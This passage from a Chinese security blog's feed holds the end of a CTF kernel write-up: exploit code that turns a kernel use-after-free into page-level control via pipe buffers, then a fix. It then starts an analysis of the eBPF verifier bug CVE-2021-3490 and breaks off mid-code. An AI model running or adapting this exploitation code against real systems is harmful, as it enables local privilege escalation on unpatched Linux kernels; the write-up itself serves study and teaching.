class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复其实比较简单，只需要把读取失败的基本块的跳转目标改到 <code>kfree()</code> 之后即可：</p><p><img src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" alt="image.png"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h1><p>感觉好像也没有什么好总结的…比较没啥亮点的两道套路题罢了…</p><p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;典中典之低质量套路 Pwn 题集合&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CISCN" scheme="https://arttnba3.github.io/tags/CISCN/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/"/>
    <id>https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/</id>
    <published>2023-06-03T18:59:40.000Z</published>
    <updated>2023-06-12T21:01:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>那一天，a3 终于回想起了被 VM Pwn 支配的恐怖</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">CVE-2021-3490</a> 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权；该漏洞在 <a href="https://lore.kernel.org/bpf/158560419880.10843.11448220440809118343.stgit@john-Precision-5820-Tower/">这个 commit</a> 中被引入，在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中被修复</p><p>本文我们选择内核版本 <code>5.11.16</code> 进行分析</p><blockquote><p>注：eBPF 相关基础知识可以看<a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">这↑里↓</a></p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><p>eBPF 指令的合法性校验通过 eBPF verifier 完成，eBPF verifier 的核心函数便是 <code>do_check()</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> &#x2F; <code>BPF_ALU64</code>）而言有如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">do_check</span>()<span class="hljs-comment">// 遍历每一条指令并根据类型调用相应函数处理</span><br><span class="hljs-built_in">check_alu_op</span>()<span class="hljs-comment">// 根据算术指令的 opcode 进行不同处理</span><br><span class="hljs-built_in">adjust_reg_min_max_vals</span>()<span class="hljs-comment">// 计算新的寄存器边界值</span><br><span class="hljs-built_in">adjust_scalar_min_max_vals</span>()<span class="hljs-comment">// 根据 opcode 计算具体的新边界值</span><br></code></pre></td></tr></table></figure><p>在 <code>adjust_scalar_min_max_vals()</code> 函数当中会对 32 位与 64 位都进行边界校验（因为实际参与运算的可能是 32 也可能是 64），计算边界值的逻辑主要是先调用 <code>scalar32_min_max_xor()</code> 计算 32 位边界值再调用 <code>scalar_min_max_xor()</code> 计算 64 位边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: 该函数在 64 位值上进行计算，但实际执行可能在 32 位值上，</span><br><span class="hljs-comment"> * 因此在 32 位的情况下，诸如位移等需要额外的检查.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_scalar_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state src_reg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_AND:<br>dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_and(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_and(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_OR:<br>dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_or(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_or(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_XOR:<br>dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_xor(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_xor(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<span class="hljs-comment">//更新边界</span><br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在更新 32 位边界值时开发者认为如果两个寄存器的低 32 位都为 <code>known</code> 那就可以<strong>直接跳过</strong>，因为 64 位时还会进行更新：</p><blockquote><p><code>tnum_subreg_is_const()</code> 会看寄存器的 <code>var_off</code> 的 mask 的低 32 位是否为 0（即全部已知）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-comment">/* 假设 scalar64_min_max_and 将被调用，</span><br><span class="hljs-comment"> * 因此跳过为已知的 32位情况更新寄存器是安全的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>在更新 64 位边界值时若两个寄存器都为 <code>known</code> 就直接调用 <code>__mark_reg_known()</code> <strong>将寄存器标为</strong> <code>known</code> <strong>并直接返回</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);<br>s64 smin_val = src_reg-&gt;smin_value;<br>u64 umax_val = src_reg-&gt;umax_value;<br><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) &#123;<br>__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p><code>__mark_reg_known()</code> 其实就是简单的调用 <code>tnum_const()</code> 设置寄存器 <code>var_off</code> 为 <code>known</code> ，并给对应边界赋值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> ___mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br>reg-&gt;var_off = tnum_const(imm);<br>reg-&gt;smin_value = (s64)imm;<br>reg-&gt;smax_value = (s64)imm;<br>reg-&gt;umin_value = imm;<br>reg-&gt;umax_value = imm;<br><br>reg-&gt;s32_min_value = (s32)imm;<br>reg-&gt;s32_max_value = (s32)imm;<br>reg-&gt;u32_min_value = (u32)imm;<br>reg-&gt;u32_max_value = (u32)imm;<br>&#125;<br><br><span class="hljs-comment">/* 标记一个寄存器的未知部分 (变量偏移或标量值) </span><br><span class="hljs-comment"> * 为已知的值 @imm.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br><span class="hljs-comment">/* Clear id, off, and union(map_ptr, range) */</span><br><span class="hljs-built_in">memset</span>(((u8 *)reg) + <span class="hljs-keyword">sizeof</span>(reg-&gt;type), <span class="hljs-number">0</span>,<br>       offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off) - <span class="hljs-keyword">sizeof</span>(reg-&gt;type));<br>___mark_reg_known(reg, imm);<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><p>但这样存在一个问题，<strong>若存在一个高 32 位 unknown 的寄存器，则不会调用</strong> <code>__mark_reg_known()</code> <strong>更新 32 位的边界值，而只会更新 64 位边界值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 我们从 var_off 中获取最小值, 因为其本质上是按位的.</span><br><span class="hljs-comment"> * 我们的最大值为操作数中所有最大值的最小值.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;<br>dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);<br><span class="hljs-keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="hljs-number">0</span> || smin_val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 在加上负值时会丢失有符号的范围，</span><br><span class="hljs-comment"> * 没人有时间搞这个.  // 译注：原文如此</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = S64_MIN;<br>dst_reg-&gt;smax_value = S64_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* 两个正值做与还是正值, </span><br><span class="hljs-comment"> * 故可以很安全地将结果转为 s64.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;<br>dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;<br>&#125;<br><span class="hljs-comment">/* 我们可能从 var_off 中获取到更多 */</span><br>__update_reg_bounds(dst_reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里笔者举一个非常简单的<del>并且已经在其他各大师傅的漏洞分析的文章里用烂了的</del>例子：</p><ul><li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;;</code> ：该寄存器低 32 位值已知为 1，高 32 位不确定</li><li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;;</code> ：该寄存器 64 位值全部已知，为 <code>0x100000002</code></li></ul><p>假如我们将 R2 与 R3 做与运算，在刚进入 switch 时会先调用 <code>tnum_and()</code> 进行计算并将结构保存到 <code>R2-&gt;var_off</code>，由于 R3 全部确定而 R2 的高 32 位不确定，因此运算结果为 <code>&#123; .value = 0x0, .mask = 0x100000000 &#125;</code>，即仅有第 32 位是不确定的</p><p>接下来继续回到 <code>scalar_min_max_and()</code>中，该函数最后会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg32_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);<br><br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;s32_min_value = <span class="hljs-type">max_t</span>(s32, reg-&gt;s32_min_value,<br>var32_off.value | (var32_off.mask &amp; S32_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;s32_max_value = <span class="hljs-type">min_t</span>(s32, reg-&gt;s32_max_value,<br>var32_off.value | (var32_off.mask &amp; S32_MAX));<br>reg-&gt;u32_min_value = <span class="hljs-type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);<br>reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,<br> (u32)(var32_off.value | var32_off.mask));<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg64_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;smin_value = <span class="hljs-type">max_t</span>(s64, reg-&gt;smin_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;smax_value = <span class="hljs-type">min_t</span>(s64, reg-&gt;smax_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));<br>reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);<br>reg-&gt;umax_value = min(reg-&gt;umax_value,<br>      reg-&gt;var_off.value | reg-&gt;var_off.mask);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__update_reg32_bounds(reg);<br>__update_reg64_bounds(reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算方法如下：</p><ul><li>最小边界值 &#x3D; 【<code>min_value</code> 、 <code>var_off</code> 已知值】中的最大者</li><li>最大边界值 &#x3D;【 <code>max_value</code> 、 <code>var_off</code> 已知值】中的最小者</li></ul><p>由于 R2 的 32 位初始边界值未经过更新，仍为其原值 <code>1</code>，因此经过该轮计算之后 R2 的<strong>最小值为 1，最大值为 0</strong>，而这显然是不合理的</p><p>回到  <code>adjust_scalar_min_max_vals()</code> 中，其最后也会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br>mark_reg_unknown(env, regs, insn-&gt;dst_reg);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__reg_deduce_bounds()</code> 主要再做一次边界调整校验的工作，这里 32 位与 64 位都用的同一套逻辑：</p><ul><li>若有符号最小值边界大于等于 0 或 有符号最大值边界小于 0 ，则更新有符号最小值边界为有符号与无符号最小值边界中的最大值，并更新有符号最大值边界为有符号与无符号最大值边界中的最小值，之后直接返回</li><li>若无符号最大值边界没有超过有符号范围（最高位不为1），则将有符号最小值设为无符号最小值，有符号最大值设为有符号与无符号最大值中的最小值</li><li>否则，若无符号最小值边界超过有符号范围（最高位为1），则将有符号最小值设为有符号与无符号最小值中的最大值，将有符号最大值设为无符号最大值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 使用有符号的最小/最大值赋值无符号, 反之亦然 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg32_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* 从有符号边界中获取符号.</span><br><span class="hljs-comment"> * 若我们无法穿过符号边界，有符号与无符号边界相同，故合并.</span><br><span class="hljs-comment"> * 这在负数情况下也有用，例如：</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 意味着 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;s32_min_value &gt;= <span class="hljs-number">0</span> || reg-&gt;s32_max_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* 从无符号边界中获取边界.  </span><br><span class="hljs-comment"> * 有符号边界穿过了有符号范围，我们必须小心.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_max_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 正数. 我们无法从 smin 获取任何东西, </span><br><span class="hljs-comment"> * 但 smax 是正数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value;<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_min_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 负数.  我们无法从 smax 获取任何东西,</span><br><span class="hljs-comment"> * 但 smin 是负数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg64_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* Learn sign from signed bounds.</span><br><span class="hljs-comment"> * If we cannot cross the sign boundary, then signed and unsigned bounds</span><br><span class="hljs-comment"> * are the same, so combine.  This works even in the negative case, e.g.</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;smin_value &gt;= <span class="hljs-number">0</span> || reg-&gt;smax_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = 